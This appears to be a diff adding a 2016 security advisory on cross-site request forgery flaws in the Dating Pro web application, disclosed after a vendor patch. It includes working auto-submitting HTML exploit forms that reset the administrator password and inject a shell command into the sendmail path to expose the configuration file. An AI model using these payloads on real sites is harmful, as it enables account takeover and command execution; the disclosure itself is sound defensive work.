@@ -1,0 +1,99 @@
+Advisory ID: HTB23294
+Product: Dating Pro
+Vendor: DatingPro
+Vulnerable Version(s): Genie (2015.7) and probably prior
+Tested Version: Genie (2015.7)
+Advisory Publication:  February 10, 2016  [without technical details]
+Vendor Notification: February 10, 2016 
+Vendor Patch: February 29, 2016 
+Public Disclosure: March 18, 2016 
+Vulnerability Type: Cross-Site Request Forgery [CWE-352]
+Risk Level: Critical 
+CVSSv3 Base Scores: 8.8 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H], 9.6 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H]
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered multiple Cross-Site Request Forgery (CSRF) vulnerabilities in a popular dating social network Dating Pro. 
+
+A remote unauthenticated attacker can perform CSRF attacks to change administrator’s credentials and execute arbitrary system commands. Successful exploitation of the vulnerability may allow attacker to gain complete control over the vulnerable website, all its users and databases. 
+
+
+1) CSRF in "/admin/ausers/index"
+
+The vulnerability exists due to the absence of validation of HTTP request origin in "/admin/ausers/index" script. A remote unauthenticated attacker can create a specially crafted malicious web page with CSRF exploit, trick a logged-in administrator to visit the page, spoof the HTTP request as if it was coming from the legitimate user, and change login, email address and password of the current website administrator. This means a total takeover of the website. 
+
+A simple CSRF exploit below will change login, email and password to "admin", "admin@mail.com" and "123456" respectively. 
+
+To reproduce the vulnerability, just create an empty HTML file, paste the CSRF exploit code into it, login to iTop website and open the file in your browser:
+
+
+<form action="http://[host]/admin/ausers/index" method="post" name="main">
+<input type="hidden" name="nickname" value="admin">
+<input type="hidden" name="email" value="admin@mail.com">
+<input type="hidden" name="update_password" value="1">
+<input type="hidden" name="password" value="123456">
+<input type="hidden" name="repassword" value="123456">
+<input type="hidden" name="name" value="admin">
+<input type="hidden" name="description" value="">
+<input type="hidden" name="btn_save" value="Save">
+<input value="submit" id="btn" type="submit" />
+</form><script>document.main.submit();</script>
+
+
+Now you can login as administrator using the above-mentioned credentials.
+
+
+2) CSRF in /admin/notifications/settings/
+
+The vulnerability exists due to absence of validation of HTTP request origin in "/admin/notifications/settings/" script. A remote unauthenticated attacker can create a specially crafted malicious web page with CSRF exploit, trick a logged-in administrator to visit the page, spoof the HTTP request as if it was coming from the legitimate user, and execute arbitrary system commands with privileges of the web server. 
+
+A simple exploit below will replace full path to sendmail program with the following "cp config.php config.txt" system command that will copy "config.php" file into "config.txt" making its content publicly accessible:
+
+
+<form action="http://[host]/admin/notifications/settings/" method="post" name="main">
+<input type="hidden" name="mail_charset" value="utf-8">
+<input type="hidden" name="mail_protocol" value="sendmail">
+<input type="hidden" name="mail_useragent" value="pg-mailer">
+<input type="hidden" name="mail_from_email" value="admin@site.com">
+<input type="hidden" name="mail_from_name" value="PgSoftware">
+<input type="hidden" name="" value="">
+<input type="hidden" name="btn_save" value="Save">
+<input type="hidden" name="mail_mailpath" value="cp config.php config.txt ||">
+</form><script>document.main.submit();</script>
+
+
+The command will be executed the next time when any email is being sent by the vulnerable web application. 
+
+It is also possible to trigger this event using the following following CSRF exploit:
+
+
+<form action="http://[host]/admin/notifications/settings/" method="post" name="main">
+<input type="hidden" name="mail_to_email" value="mail@mail.com">
+<input type="hidden" name="btn_test" value="Send">
+</form><script>document.main.submit();</script>
+
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to Genie (2015.7) released after February 29, 2016.
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23294 - https://www.htbridge.com/advisory/HTB23294  - Admin Password Reset & RCE via CSRF in Dating Pro
+[2] Dating Pro - http://www.datingpro.com - Everything you need to start and run a dating business.
+[3] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[4] ImmuniWeb® - https://www.htbridge.com/immuniweb/ - web security platform by High-Tech Bridge for on-demand and continuous web application security, vulnerability management, monitoring and PCI DSS compliance.
+[5] Free SSL/TLS Server test - https://www.htbridge.com/ssl/ - check your SSL implementation for PCI DSS and NIST compliance. Supports all types of protocols.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
